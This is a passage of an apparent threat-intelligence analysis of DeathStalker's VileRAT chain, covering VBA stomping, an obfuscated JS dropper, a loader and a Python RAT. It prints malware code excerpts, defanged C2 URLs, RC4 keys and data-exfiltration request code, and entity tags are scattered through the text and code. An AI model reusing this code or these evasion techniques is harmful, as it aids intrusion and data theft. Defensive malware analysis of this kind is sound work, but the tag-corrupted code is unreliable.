Type=\"url \" Target=\"hxxp://plantgrn[.]com / HjSYaquyA5umRSZcy%2B0xLfaIdgf5Qq8BA6EggZELrzkAAADvNjKmxl00LiQYCUFp2DSHYB8NW TargetMode=\"External\"/></Relationships > Figure [CARDINAL] 3 . Malicious remote template inclusion in infection DOCXThe malicious [GPE] DOTM remote templates leverage the [ORG] VBA stomping technique to conceal the code of an embedded macro . [ORG] VBA stomping involves making the editable [ORG] VBA source code ( i.e. , the visible code of a macro ) different from the code that will actually be executed . This is possible because both the editable ( visible ) source code and a2/21transformed internal version of it called p - code are embedded in macro - enabled documents . As a result of [ORG] VBA stomping , the real macro code that will be executed is hidden from standard tools ( [ORG] Microsoft Word \u2019s macro edition tools , but also OLETools).This technique comes with a drastic limitation : the hidden macro ( i.e. , internal p - code ) can only be executed if the macro - enabled document is opened with the same [ORG] Office version from which it was generated . Otherwise , the hidden macro can not run , and the visible one will be executed instead . In this last case , [ORG] DeathStalker ensured it would result in a popup message to the user ( see Figure [CARDINAL] 4 ) . But most of all , [ORG] DeathStalker ensured that it distributed several variants of infection documents to their targets , each one being prepared for a specific [ORG] Office version . Figure [CARDINAL] 4 . [ORG] VBA stomping failure in a malicious [GPE] DOTM remote templateIn any case , the visible and hidden macros download a picture to replace the social engineering message in the infection document ( see Figure [CARDINAL] 5 ) and trick the readers into believing something failed . Figure [CARDINAL] 5 . Example of a downloaded image upon macro executionIn the background , however , provided the [ORG] VBA stomping worked , the [GPE] DOTM - embedded macro silently gathers information about security products that are installed on the target computer ( using [ORG] WMI ) , sends them to a command- and - control ( C2 ) server , decodes and drops files , then ultimately executes a malicious obfuscated JavaScript ( JS ) backdoor we called [ORG] VileDropper . The [GPE] DOTM - embedded macro itself already reveals some interesting and specific techniques . It is lightly obfuscated , as most text strings are XOR - encoded ( see Figure [CARDINAL] 6 ) with a password that is derived from a sentence ( e.g. , \u201c Operates [NORP] Catholic small towns pueblos [CARDINAL] Two of\u201c).123456789Function decodestring(dt As String ) As StringOn Error [PERSON] Resume [PERSON] NextDim ks As [PERSON] Stringks = decodepasswordDim dl As Longdl = ( ( Len(dt ) / [CARDINAL] 2 ) - 1)kl = Len(ks)Dim s As Strings = \" \" 10For i = 0 To dl11Dim c1 As Integer12Dim c2 As [ORG] Integer13c1 = Val(\"&H \" [ORG] & [ORG] Mid(dt , ( ( i * [CARDINAL] 2 ) + 1 ) , [CARDINAL] 2))14c2 = [ORG] Asc(Mid(ks , ( i Mod kl ) + 1 , 1))15s = s & Chr(c1 Xor c2)16Next17decodestring = s18End FunctionFigure 6 . XOR decoding function ( renamed for clarity ) in [GPE] DOTM - embedded macroThe XOR decoding algorithm looks very close to the one that has been leveraged in VBS loader scripts from the [ORG] PowerPepper toolchain ( see Figure [CARDINAL] 7 ) in the past , and seemingly legitimate function names are also reminiscent of those that were used by [ORG] PowerPepper macros ( e.g. , \u201c insert_table_of_figures \u201d , \u201c change_highlight_color \u201d , etc.).3/21123456789Function DelPort(GeneralText)Dim Argv : Argv = WScript . Arguments(0)GeneralText = Replace(GeneralText , \" 44f\",\"44\")Dim z , i , cvpo , vpcol , sdfiko , gfdvvc , sdfopkFor i = 1 To Len(GeneralText)cvpo = cvpo [CARDINAL] + [CARDINAL] 1If cvpo > Len(Argv ) Then cvpo = [CARDINAL] 1gfdvvc = Asc(Mid(Argv , cvpo , [CARDINAL] 1))If i > Len(GeneralText ) \\ 2 Then Exit For10vpcol = CByte(\"&H \" [WORK_OF_ART] & [WORK_OF_ART] Mid(GeneralText , i * [CARDINAL] 2 - 1 , [CARDINAL] 2))11sdfiko = vpcol Xor gfdvvc12z = z & Chr(sdfiko)13Next14DelPort = [CARDINAL] z15End FunctionFigure 7 . XOR decoding function in a [ORG] PowerPepper [ORG] VBS loader ( MD5 DB6D1F6AB887383782E4E3D6E4AACDD0)The DOTM - embedded macro decodes and drops two files ( in the \u201c % APPDATA% \u201d folder : \u201c [ORG] Redist.txt \u201d and \u201c [WORK_OF_ART] ThirdPartyNotice.txt \u201d , or \u201c pattern.txt \u201d and \u201c changelog.txt \u201d ) out of encoded data that is stored in non - visible [PERSON] TextBox forms ( see Figure [CARDINAL] 8) . Leveraging Office object properties as hidden data sources is also something we have previously seen with [ORG] PowerPepper . Figure [CARDINAL] 8 . [CARDINAL] TextBox form used as a data store within malicious [GPE] DOTM documents , as shown by [ORG] Microsoft \u2019s [ORG] VBA editorAnother notable feature is that the [GPE] DOTM - embedded macro signals progression or errors during the execution by sending HTTP GET requests to fixed [CARDINAL] C2 URLs . Interestingly , all HTTP requests in the [ORG] VBA macro are triggered using remote picture insertion functions ( see Figure [CARDINAL] 9).123doc . [PERSON] Shapes . [ORG] AddPicture ( decodestring(\"09184015545D5B1B1B07501E001F5C4B0D1D5B3B2D3647143422115728383E1D3E2A024B06025B [PERSON] 0F1C023 ' hxxp://hubflash[.]co / HCSqfUN%2FJJnPO49gnojrpDo%2BMxnGrYaL161m49AhAAAA%2FwQ5Tgt6JlNOpWd1chDdUc5MB1HWBB9Yq3EECIbTO8uXFigure 9 . DOTM - embedded macro leverages \u201c [ORG] AddPicture \u201d as a Web clientIn any case , the [GPE] DOTM - embedded macro finally triggers [ORG] VileDropper \u2019s execution , using a renamed copy of the \u201c [WORK_OF_ART] WScript \u201d interpreter ( \u201c msdcat.exe \u201d or \u201c msgmft.exe \u201d in the \u201c % APPDATA% \u201d folder ) , with a command such [PERSON] as:1 msgmft.exe /E : jScrIpt \" \\changelog.txt \" [QUANTITY] 91 [QUANTITY] pattern.txt\u201cchangelog.txt \u201d is [ORG] VileDropper , while \u201c [CARDINAL] 91 \u201d is part of password used by [ORG] VileDropper to decode [ORG] XORed data , and \u201c pattern.txt \u201d is an encoded package that contains [ORG] VileLoader . [ORG] VileDropper : an overly obfuscated task scheduler4/21Next in [ORG] DeathStalker \u2019s intricate VileRAT infection chain comes [ORG] VileDropper . It is an obfuscated [ORG] JavaScript file that mainly drops and schedules the execution of the next stage : VileLoader.1234567891011121314var _ 0x140c9e;//ACCS3_0x36bbe9 : { //ACCS3try { //ACCS3var _ [CARDINAL] 0x527036 = _ [QUANTITY] 0x112a30 [QUANTITY] + ' \\x5c ' + WScript[_0x1dbcbb(0x38c)](0x1),//ACCS3_0x33ee6e = _ [CARDINAL] 0x3b3918[_0x4462ad[_0x1dbcbb(0x312)](_0x4459df , _ 0x4462ad[_0x1dbcbb(0x23d)])](_0x527036 , 0x1),//ACCS3_0x46efdf = _ 0x33ee6e[_0x4459df(_0x1dbcbb(0x1e7 ) + _ 0x1dbcbb(0x29c))]();//ACCS3_0x33ee6e[_0x1dbcbb(0x37a ) ] ( ) , _ 0x3b3918[_0x1dbcbb(0x38f)](_0x527036 ) , _ 0x527036 = '' ; //ACCS3for ( _ 0x33ee6e = [CARDINAL] 0x0 ; _ 0x33ee6e < _ 0x46efdf[_0x1dbcbb(0x2fa ) ] - 0x2 ; _ 0x33ee6e + = 0x2)//ACCS3_0x527036 + = [NORP] String[_0x1dbcbb(0x259 ) + ' de'](parseInt(_0x46efdf[_0x1dbcbb(0x2f4)](_0x33ee6e , _ 0x33ee6e + 0x2 ) , 0x10));//ACCS3_0x140c9e = _ 0x527036;//ACCS3break _ 0x36bbe9;//ACCS3 } catch ( _ 0x48c9c6 ) { } //ACCS3_0x140c9e = void 0x0;//ACCS3}//ACCS3Figure [CARDINAL] 10 . [ORG] VileDropper code excerpt in its original formVileDropper needs [CARDINAL] at [CARDINAL] least [CARDINAL] two arguments to run for the [ORDINAL] first time ( a [ORDINAL] third may be used as a flag to trigger environment - specific execution variations , depending on security products that are installed on targeted computers):the [ORDINAL] first one is a partial password ( used to decode XOR - encoded data ) , the [ORDINAL] second is a path to an encoded payload file ( contains [ORG] VileLoader and its companion shellcode).VileDropper also checks its interpreter and file name , to immediately stop execution if it is not called as planned ( this is probably done to evade sandboxes ) , as can be seen in the following deobfuscated code excerpt:123456789if ( aWShell1[\"CurrentDirectory\"][\"toLowerCase \" ] ( ) ! = aAppDataPath1[\"toLowerCase \" ] ( ) ) { WScript[\"Quit\"]();}if ( ! sArgThird1 ) { if ( -0x1 = = aScriptHostFullpath1[\"indexOf\"](\"msdcat \" ) ) { WScript[\"Quit \" ] ( ) ; } } else { if ( -0x1 = = aScriptHostFullpath1[\"indexOf\"](\"cscript \" ) ) { [DATE] 10WScript[\"Quit\"]();11}12}Figure [DATE] 11 . Deobfuscated execution check in VileDropperVileDropper \u2019s exact execution flow depends on the security products that are installed on the targeted computer , but most of the time , it copies itself to another file , relaunches itself , and deletes its original copy . During execution [ORG] VileDropper : gathers additional data on the targeted environment ( using [ORG] WMI ) as well as generating a target identifier and sends them to a [CARDINAL] C2 server ; decodes and drops [ORG] VileLoader and its encoded companion shellcode . The file names and location will vary depending on samples , but they are placed under a seemingly legitimate common folder in \u201c % APPDATA% \u201d ( e.g. , \u201c exe \u201d and \u201c dev0Y11ZF.tmp \u201d in \u201c % APPDATA%\\Microsoft\\Printer Settings\\Printers\\ \u201d ) ; schedules a task to run [ORG] VileLoader [TIME] 35 [TIME] to [TIME] 65 [TIME] seconds [TIME] later , then indefinitely [TIME] every [TIME] three [TIME] hours and 45 minutes.5/21VileDropper sends data to a [CARDINAL] C2 server using an HTTP GET request to a fixed URL ( e.g. , \u201c hxxp://hubflash[.]co / admin / auth.php \u201d ) , using a preset [ORG] User - Agent ( both the C2 URL and the [ORG] User - Agent change depending on [ORG] VileDropper samples ) . The useful information is stored as a JSON document , which is then XOR- encoded , base64 - encoded , URL - encoded , and set as a cookie value in the HTTP request : JSON KeyudanwContent ( JSON value ) A target identifier . The identifier is a custom UUID - like representation of the target \u2019s login ( % USERNAME% environment variable ) and computer [PERSON] UUID ( as obtained in the [ORDINAL] first result of the [ORG] WMI query : SELECT UUID FROM Win32_ComputerSystemProduct ) . This UUID - like value is then base64 - encoded and URL - encoded . Due to fixed lengths and padding from the identifier generation logic , the identifier \u2019s final form is always [CARDINAL] 48 characters long . A hard - coded [ORG] VileDropper identifier , which might designate a campaign or version ( e.g. , \u201c [CARDINAL] 9745B355 \u201d ) . A list of the names of the security products ( AntiVirusProduct in WMI ) that are installed on the target computer , separated by the pipe sign ( | ) , then [ORG] XORed , base64 - encoded and [ORG] URL- encoded . The target \u2019s fully qualified login , as the shell expansion of \u201c % USERDOMAIN%\\%USERNAME% \u201d , which is then [ORG] XORed , base64 - encoded and [ORG] URL- encoded . The target \u2019s operating system version , as returned from the [ORG] WMI query [ORG] SELECT [ORG] Version FROM Win32_OperatingSystem , then base64 - encoded and URL - encoded . The task that is scheduled by [ORG] VileDropper ( whose name varies depending on samples , e.g. , \u201c CDS Sync \u201d or \u201c [PRODUCT] UpdateModel [PRODUCT] Task \u201d ) , triggers the following type of execution command:1 % APPDATA%\\Microsoft\\Printer Settings\\Printers\\FWDeviceEnabler.exe \" [ u ] \" \" < encoded companion shellcode file name > \" \" [ a ] \" \" [ w ] \" 0 \" [ d ] \" \" [ n ] \" < a letter of the encoded companion shellcode file name > The characters between square brackets ( such as [ u ] ) in the command line designate the content of the corresponding JSON key ( i.e. , [ u ] is the encoded target identifier ) . A XORing interludeBefore moving on to [ORG] VileLoader , a note on the XOR encoding scheme that is leveraged by [ORG] VileDropper to protect data sent to the [CARDINAL] C2 server , as similar schemes will be used further on . The algorithm generates data blobs that are laid out as follows ( then sometimes further base64 - encoded and URL - encoded):Type A:1 [ XOR key ( [CARDINAL] 6 random bytes)][XOR - encoded data]The resulting blobs are self - sufficient and can be decoded by the recipient ( as well as any [ORDINAL] third party \u2026 ) without any access to the pre - shared key . In [ORG] VileDropper , strings that are encoded as part of the [PRODUCT] JavaScript obfuscation benefit from an additional XORing step : the XOR key that is embedded in data blobs is additionally [ORG] XORed with a script- specific fixed password ( a part of this fixed password is passed to [ORG] VileDropper on its execution command line by the previous [GPE] DOTM macro in the infection chain , the other part is hard - coded in [ORG] VileDropper itself).Later , [ORG] VileLoader and VileRAT use other variants of this algorithm , which produces data blobs that are laid out as [CARDINAL] one of the following options : Type B:1 [ XOR key length ( variable)][XOR key ( random bytes)][Padding][XOR - encoded data]Type C:1 [ XOR - encoded data [NORP] length][XOR - encoded data][XOR key length ( variable)][XOR key ( random bytes)]Type D:1 [ XOR key length ( variable)][XOR key ( random bytes)][XOR - encoded data [NORP] length][XOR - encoded data ] VileLoader : an evasive multi - stage implant downloaderVileLoader is a remarkable piece of the VileRAT compromise approach . While it has existed since [DATE] Q2 [DATE] 2020 ( it was [ORDINAL] first publicly documented as dddp.exe ) , it has been continuously updated and maintained since , and is still deployed from [ORG] VileDropper at the time of writing . VileLoader \u2019s main goal is to download and execute an additional payload from a C2 server . Though we have only observed it triggering the execution of VileRAT , the loader can technically download and execute other implants . Recent VileLoader samples are composed of a binary executable ( stage [CARDINAL] 1 ) and an encoded companion shellcode file ( stage [CARDINAL] 2 ) . Previous samples of [ORG] VileLoader usually embedded the shellcode within the binary executable directly , and presented themselves as a single monolithic file.6/21Stage 1 \u2013 Doctored binary unpackerVileLoader is initially presented as a binary executable , which ensures the [ORDINAL] first stage of the execution . This binary is always a legitimate one , which is meticulously doctored by the attackers to integrate a malicious unpacker - type payload . As such , the binary may appear legitimate from a quick automated static code analysis perspective : it includes all the code of a legitimate application ( but will not work as expected ) . This \u201c unpacker \u201d stage is aimed at decoding , loading , and executing the [ORDINAL] second stage in memory . [ORG] VileLoader \u2019s workflow starts by waiting [TIME] 17 [TIME] seconds . Then it parses the command line arguments . The command line must include [CARDINAL] five arguments at least , or [ORG] VileLoader terminates the execution . In practice , [ORG] VileDropper usually gives [CARDINAL] seven arguments to [ORG] VileLoader , as we have previously described . VileLoader then opens its encoded companion shellcode file ( whose name is passed as a [ORDINAL] second argument to [ORG] VileLoader , e.g. , \u201c devENX1C6SS.tmp \u201d ) , reads and decodes it ( using the Type B XOR algorithm ) , maps the deobfuscated data in a region with read , write and execute ( [ORG] RWX ) permissions , and runs the next stage ( stage [CARDINAL] 2 ) by starting a new thread . VileLoader \u2019s [ORDINAL] first stage contains very unique \u201c signature \u201d techniques that have been stable since the [ORDINAL] first sample we analyzed in [CARDINAL] Q2 2020:\u201cSleep \u201d and \u201c GetTickCount \u201d Windows API functions are leveraged to generate random waiting delays . Those functions are resolved in an unusual way : by referencing hard - coded offsets from the beginning of the current binary image that point directly to entries in the legitimate executable \u2019s import address table ( IAT ) ; the unpacking and loading of [ORG] VileLoader \u2019s encoded companion shellcode file leverages multiple custom - made system calls , that are similar to low - level [PRODUCT] Windows [PRODUCT] API functions ( [ORG] NTDLL ) for different Windows versions : NtOpenFile , NtReadFile , [ORG] NtAllocateVirtualMemory , [ORG] NtCreateThreadEx and [ORG] NtWaitForSingleObject ( see Figure [CARDINAL] 12).Figure [CARDINAL] 12 . VileLoader \u2019s stage [CARDINAL] 1 custom - made system callHowever , while older samples parsed command line arguments by resolving and calling dedicated [PRODUCT] Windows [PRODUCT] API functions ( such as \u201c GetCommandLineW \u201d ) , the recent samples directly read this information from their own [PERSON] PEB ( Process Environment Block ) structure . This may have been done to better bypass the detection of some security solutions . Stage 2 \u2013 In - memory downloaderThe [ORDINAL] second stage content is extracted from [ORG] VileLoader \u2019s encoded companion shellcode file , and run by [ORG] VileLoader \u2019s [ORDINAL] first stage in - memory , in a new thread . From a data perspective , the [ORDINAL] second stage shellcode ( once unpacked by the [ORDINAL] first stage ) is a [ORG] PE binary that is stripped of its headers and embeds additional encoded data . This [ORDINAL] second stage starts by decoding the required data from its own content ( using [LAW] the [LAW] Type [LAW] C [LAW] XOR algorithm ) . Some data are decoded as hash values that were generated with the djb2 algorithm . Those hashes are in turn used to resolve the required function imports through a homebrew [ORG] IAT : required libraries are loaded , their export tables are parsed , exported function names are hashed with djb2 , and the hashes are compared to hashes that were decoded from internal data . Stage 2 continues by creating a mutex , whose name has been stable since [DATE] Q2 [DATE] 2020 , and which is the same as in VileRAT ( \u201c Global\\wU3aqu1t2y8uN\u201d).Finally , VileLoader \u2019s [ORDINAL] second stage builds an HTTP GET request that is used to download an implant package . In older VileLoader samples , the downloader used a static URL that looked as follows:1 url 1>&a=<argument 2>&c=<argument [CARDINAL] 3 > The only evasion attempt consisted in randomly choosing an HTTP User - Agent header value amongst a fixed list of [CARDINAL] four . VileLoader used the targeted system \u2019s uptime as a source of \u201c randomness \u201d . In recent samples , developers tried to improve these evasion techniques , and the HTTP request now looks like this:1GET /administrator / index.php HTTP/1.12Connection : keep - Alive3Accept - Language : en - US , en;q=0.84Accept : * /*5Referer : url source=<encrypted blob>;7/2178User - Agent : Mozilla/5.0 ( Windows NT [CARDINAL] 10.0 ; Win64 ; x64 ) [ORG] AppleWebKit/537.36 ( [ORG] KHTML , like [ORG] Gecko ) Chrome/92.0.4515.131 Safari/537.36Host : corstand[.]comAll values that are colored in red are now chosen at random from a hard - coded list that is decoded from the stage 2 content ( using [LAW] the [LAW] Type [LAW] C [LAW] XOR algorithm ) . The encrypted blob ( cookie value ) is initially a JSON dictionary , encrypted with the RC4 algorithm ( using the key \u201c [ORG] BD [ORG] DE 96 D2 9C 68 EE 06 49 64 D1 E5 [CARDINAL] 8A 86 05 [CARDINAL] 12 B0 9A 50 00 [CARDINAL] 4E [CARDINAL] F2 E4 92 5C 76 AB FC [CARDINAL] 90 23 DF C6 \u201d , decoded from stage 2 content ) , [ORG] XORed ( using the Type B XOR algorithm ) , base64- encoded and URL - encoded . The actual [PERSON] JSON content is very similar to the one that is sent by [ORG] VileDropper to the [CARDINAL] C2 server : JSON [ORG] KeyProvided by [ORG] VileDropper via the command lineValuev [ORG] sHard - coded value ( [CARDINAL] 65 in the last sample we analyzed ) which might be a version number . The target identifier . The list of security solutions installed on the targeted computer . The target \u2019s operating system version . A fixed identifier , which might designate a campaign or version . The target \u2019s fully qualified login ( % USERDOMAIN%\\%USERNAME% ) . Flag that indicates if the mutex creation succeeded ( [CARDINAL] 1 ) or failed ( 0 ) . Current process name ( e.g. , [ORG] SerenadeDACplApp.exe ) . Constant value embedded in the code and equal to 0.The C2 server then answers in the HTTP response body , with one of the following instructions : do nothing : the answer is [CARDINAL] four null bytes ; implant package : the answer is an encoded implant package to parse ( see later ) ; send a screenshot : the answer is a byte of value \u201c [CARDINAL] 1 \u201d , followed by [CARDINAL] three null bytes . In older variants , VileLoader \u2019s [ORDINAL] second stage did not embed the screenshot capability , which was , however , implemented in VileRAT.If the [CARDINAL] C2 server answers with an implant package , it sends a Type D XORed blob . The resulting data is further decompressed using the [PRODUCT] LZMA1 algorithm , and contains [CARDINAL] one or several \u201c files \u201d with the following additional metadata : A [ORG] CSIDL value , representing the root folder in which the file must be dropped ( resolved with the \u201c SHGetFolderPathW \u201d Windows API function ) ; A subdirectory name ; A file name ; A task name if the file execution is to be scheduled ; The command - line arguments if the file is to be executed . If a specific flag is set in the [CARDINAL] C2 server response data , [ORG] VileLoader creates a [PRODUCT] Windows scheduled task for the last dropped file to set up its persistence . The task is created using the [ORG] ITaskService interface . Finally , the last dropped file is also immediately executed using the \u201c CreateProcessW \u201d Windows API function . It should be noted that some older VileLoader samples executed the downloaded payload in memory , while recent variants tend to drop the downloaded implant on the target \u2019s filesystem . If the [CARDINAL] C2 server requests a screenshot , then VileLoader stage [CARDINAL] 2 sends an [ORG] HTTP [ORG] POST request with a cookie whose value is a [ORG] XORed ( Type B algorithm ) JSON dictionary containing the following fields : JSON Key Constant value ( [CARDINAL] 1 ) . Screenshot timestamp ( in the format \u201c YYYY - MM - DD HH : [PERSON] MM : SS\u201d).The associated [ORG] HTTP [ORG] POST body data is an encoded ( using the Type B XOR algorithm ) JPEG screenshot . VileRAT \u2013 A super - packed yet still overweight Python implantVileRAT is the last known stage of the intricate eponym infection chain from [ORG] DeathStalker . It is an obfuscated and packed Python3 RAT , bundled as a standalone binary with py2exe . We [ORDINAL] first discovered it in [DATE] Q2 [DATE] 2020 , and it has also subsequently been named PyVil by other vendors . A note on VileRAT \u2019s seniorityThe Python library ( [ORG] DLL ) that is embedded in a py2exe - bundled binary usually comes from an official Python release . While analyzing VileRAT samples , we noticed that its Python [ORG] DLL is a custom compilation of Python [CARDINAL] 3.7 sources : the [ORG] DLL version is tagged as \u201c heads/3.7 - dirty\u201d[1 ] ( instead of \u201c tags / v3.7.4 \u201d for an official release , for instance ) and8/21references a shortened [PERSON] Git commit ID of \u201c [FAC] 0af9bef61a \u201d . This shortened commit ID matches one in the source code repository of the [CARDINAL] 3.7 branch of the standard [ORG] CPython implementation , which is dated to [DATE] 2020 - 05 - 23 . Due to this commit date and considering the fact that we [ORDINAL] first discovered VileRAT in [DATE] Q2 [DATE] 2020 , we believe with medium to high confidence that VileRAT was [ORDINAL] first packaged for deployment in [DATE] June [DATE] 2020.Unpacking VileRATWhen we [ORDINAL] first encountered VileRAT , we noticed that all usual decompiling tools for [GPE] Python3 ( uncompyle6 , decompyle3 and [PERSON] unpyc37 , to name just a few ) failed to correctly retrieve a Python source from the VileRAT bytecode . Some of our industry peers had the same issue when they encountered it as [PRODUCT] PyVil . Long story short : the [ORDINAL] first stage of VileRAT has been obfuscated at the Python bytecode - level , with the intention of breaking existing decompilers ( see Figure [CARDINAL] 13 ) . The bytecode is obfuscated by : adding multiple operations that do not have any effect when executed ( neutral operations ) and useless data ; adding confusing branching and exceptions handlers ; inserting invalid bytecode in sections that will never be reached during execution ( but that decompilers still try \u2013 and fail \u2013 to decompile).Figure [CARDINAL] 13 . VileRAT \u2019s [ORDINAL] first stage Python bytecode , in its original form ( left ) and deobfuscated form ( right ) . The only useful instructions of this excerpt are highlighted in red . Once cleaned at bytecode - level , the [ORDINAL] first stage of VileRAT unpacking can be properly decompiled as Python code:123456789import sysimport zlibimport base64T8 = base64.b64decodey6 = zlib.decompressm5 = T8(b'<a [QUANTITY] 7 - million+ characters long base64 string>')k9 = bytearray(m5)Y7 = bytearray(b'0sMIsDYmkeST5ZJHOfHkwmrA5JGVmpBbpKeA')N2 = bytearray(len(k9)*bytes([0]))10j = [CARDINAL] 011code_length = int(len(k9)/5)12for i in range(code_length):13if i % [CARDINAL] 3 = = 0:14N2[i ] = [NORP] k9[i ] ^ Y7[j]15N2[i ] = k9[i]16if j + 1 = = len(Y7):17j = 018j + = 19/2119N2[i :] = [ORG] k9[i:]20exec(y6(N2))VileRAT embeds no less than three layers of unpacking . The efforts that have been put into making a Python script ( VileRAT ) hard to analyze from a human perspective is a [ORG] DeathStalker signature by itself , considering they also tried the same for all the other steps in the infection chain , and that it is part of their usual approach . The last unpacking step finally extracts the VileRAT Python code and a whole bundle of its dependencies in memory \u2013 all this content causes py2exe - bundled VileRAT samples to weigh around [CARDINAL] 12 MB . The unpacking leverages decoding ( using the Type B XOR algorithm ) and [ORG] BZIP2 decompression . The final VileRAT Python package notably contains a conf.pyc module which includes a version number , as well as default [CARDINAL] C2 domain names:1234VERSION = 7.2SVC_NAME = ' AJRouter'server_urls = [ ' hxxp://pngdoma[.]com ' , ' hxxp://robmkg[.]com ' , ' hxxp://textmaticz[.]com ' , ' hxxp://goalrom[.]com']user_agent_list = [ ' Mozilla/5.0 ( Windows NT [CARDINAL] 10.0 ; Win64 ; x64 ) [ORG] AppleWebKit/537.36 ( [ORG] KHTML , like [GPE] Gecko ) Chrome/93.0.4577.63 Safari/537.36 ' , ' Mozilla/5.0 ( Windows NT [CARDINAL] 10.0 ; Win64 ; x64 ) [ORG] AppleWebKit/537.36 ( [ORG] KHTML , like [GPE] Gecko ) [PERSON] Chrome/92.0.4515.159 Safari/537.36 ' , ' Mozilla/5.0 ( Windows NT [CARDINAL] 10.0 ; Win64 ; x64 ) [ORG] AppleWebKit/537.36 ( [ORG] KHTML , like [ORG] Gecko ) Chrome/91.0.4472.164 Safari/537.36 ' , ' Mozilla/5.0 ( Windows NT [CARDINAL] 10.0 ; Win64 ; x64 ) [ORG] AppleWebKit/537.36 ( [ORG] KHTML , like [GPE] Gecko ) Chrome/90.0.4430.212 Safari/537.36']VileRAT versions and functionalitiesWe analyzed and compared various VileRAT samples , containing version numbers ranging from [CARDINAL] 2.4 to [CARDINAL] 8 . VileRAT functionalities have not changed much over time , and some functionalities from the earliest sample we analyzed have actually been dropped ( such as leveraging [ORG] SSH as a [CARDINAL] C2 channel , or screenshotting , the latter now being implemented in VileLoader instead ) . The remaining functionalities include : Arbitrary remote command execution , using an existing or downloaded binary ; Establishing [ORG] SSH connections to remote servers , possibly leveraging them to forward ports of the targeted computer to the remote server ; Keylogging ; Setting up persistence using scheduled tasks ; [PRODUCT] Listing security solutions that are installed on the target computer ; Self - updating from a C2 server . VileRAT has [CARDINAL] five distinct and exclusive execution modes , enabled from the command line , which can all be further altered with additional command switches , parameters and/or data from the C2 : Command line optionInternal name(s)-a - l - r - cenc_cmd_dataRUN_CMD_AS_USER_ARGenc_cmd_data_rssRUN_R_SSH_SHELL_ARGenc_cmd_data_rdsRUN_R_DYN_SSH_ARGcp_exe_pathExecution mode description [DATE] Arbitrary command executionThe \u201c command \u201d term is quite large : it can either be an existing binary , a shell command , a downloaded executable , a Python package , or an internal VileRAT function . In order to specify the \u201c command \u201d , a JSON dictionary[2 ] is passed as an optional parameter . Some commands will be executed by starting VileRAT again , using a distinct set of command options . VileRAT exits after this execution . [ORG] SSH connection testVileRAT starts a new process of itself , which connects to a remote [ORG] SSH server ( using a private key ) , then \u2026 closes the connection . This [ORG] SSH connection used to serve as a [CARDINAL] C2 channel in previous samples , but the C2 logic has been removed in recent samples . In order to specify the [ORG] SSH connection settings , a JSON dictionary is passed as an optional parameter . VileRAT exits after this execution . [ORG] SSH - tunneled local port [ORG] forwardVileRAT starts a new process of itself , which connects to a remote [ORG] SSH server ( using a password ) . This connection is leveraged as a tunnel to forward ports from the target computer to the remote server . In order to specify the [ORG] SSH connection settings , a JSON dictionary is passed as an optional parameter . VileRAT quits once the remote end has connected to the forwarded port at least once , and subsequently closed the connection . Arbitrary file deletion10/21 - trtsIS_TASK_SCHED_ARGVileRAT attempts to delete a file , whose path is given as a clear text command parameter . VileRAT quits when the file is deleted or when the maximum number of attempts ( [CARDINAL] 10 ) is reached . Main C2 client modeThis is the main execution mode for VileRAT . It regularly polls a [CARDINAL] C2 server for commands to execute . The commands that can be executed are [CARDINAL] one of those described in this table ( [PERSON] RUN_R_SSH_SHELL_ARG , RUN_CMD_AS_USER_ARG , RUN_R_DYN_SSH_ARG ) , or [CARDINAL] one of the additional VileRAT internal update commands . CMD_UPDATE_SVC triggers a ( partial or complete ) VileRAT update from a C2 - downloaded package , while CMD_UPDATE_CONF can update internal delays and enable a keylogger if the C2 requires so . In a typical [ORDINAL] first execution for VileRAT , as we identified in [DATE] 2022 , the implant is started with the following arguments:1 ImagesInfo.exe \" [ u ] \" -x -m \" [ORG] EDP CredsTask \" -iNote than in this case , the target identifier that is passed as the [ORDINAL] first argument is not actually exploited by VileRAT , and may just be used by the attacker to easily identify running VileRAT processes later . Older VileRAT variants were usually launched with explicit \u201c -f \u201d and \u201c -t \u201d command line switches : those are now implicit and enabled by default . Here is the list of some notable VileRAT changes we spotted as the versions evolved , apart from regular updates to fix code bugs or handle uncaught exceptions , refactor code , update dependencies , and change configuration : Between versions [CARDINAL] 2.4 and [CARDINAL] 2.7 , VileRAT dropped the capability to use a remote [ORG] SSH server as a [CARDINAL] C2 channel , as well as the screenshot implementation ; In version [CARDINAL] 3.0 , the base64 - encoded RC4 key which is used for various encryption routines changed from \u201c Ixada4bxU3G0AgjcX+s0AYndBs4wiviTVIAwDiiEPPA= \u201d to \u201c XMpPrh70/0YsN3aPc4Q4VmopzKMGvhzlG4f6vk4LKkI= \u201d , and an additional XOR pass ( of Type B ) was added in encoding schemes . The VileRAT remote update mechanism was refactored , and an additional command switch ( called pmode ) was added ; In version [CARDINAL] 3.7 , specific [ORG] Chrome version and [ORG] Trezor wallet reconnaissance functions that we initially identified for version [CARDINAL] 2.4 were removed from the code , and VileRAT lost the ability to update from files provided on the filesystem where it was running ; In version [CARDINAL] 5.4 , the way [ORG] UUID - type identifiers were generated changed ; In version [CARDINAL] 6.5 , an additional command switch ( called jmode ) was added ; In version [CARDINAL] 6.6 , \u201c -f \u201d and \u201c -t \u201d command options were enabled by default . VileRAT HTTP C2 protocolVileRAT \u2019s main [CARDINAL] C2 communication loop , as executed during [ORG] Main [ORG] C2 client mode ( as described in VileRAT functionalities above ) , is quite straightforward and runs in a separate thread : Every 2 - 5 minutes , VileRAT tries to send an [ORG] HTTP [ORG] POST request to each of the [CARDINAL] C2 servers that exist in its configuration , until [CARDINAL] one replies or until the list is exhausted . Environment data is embedded in a JSON dictionary , which is encrypted using RC4 , encoded using the Type B XOR algorithm , base64 - encoded and URL - encoded , then finally set as the HTTP request URL path ( see Figure [CARDINAL] 14 ) ; A C2 server may reply with an HTTP response , whose body can include an encoded and encrypted JSON array . If so , the JSON must contain at least a command to execute.123456789def get_request_data(req_type , xmode , pmode):data = { ' type ' : ' svc','xmode ' : xmode,'pmode ' : pmode,'req_type ' : req_type,'svc_ver ' : conf . VERSION,'svc_name ' : conf . SVC_NAME,'ext_uuid ' : get_ext_uuid(),10'svc_uuid ' : get_service_uuid(),11'old_svc_uuid ' : get_old_service_uuid(),12'host ' : get_hostname(),11/2113'uname ' : get_username(),14'ia ' : win32.hap(),15'wv ' : win32.gwv(),16'dt ' : datetime.datetime.now().strftime('%Y-%m-%d % H-%M-%S'),17'xn ' : os.path.basename(sys.executable)18}19if req_type = = REQ_GET_CMD:20data['gc ' ] = global_conf21data['klr ' ] = keylogger.kl_run22data['cr ' ] = win32.is_process_exist(exe_name='chrome.exe')23data['avs ' ] = get_av_list()24elif req_type in [ REQ_FIRST_RUN , REQ_INSTALL_DONE]:25data['avs ' ] = get_av_list()2627enc_data = 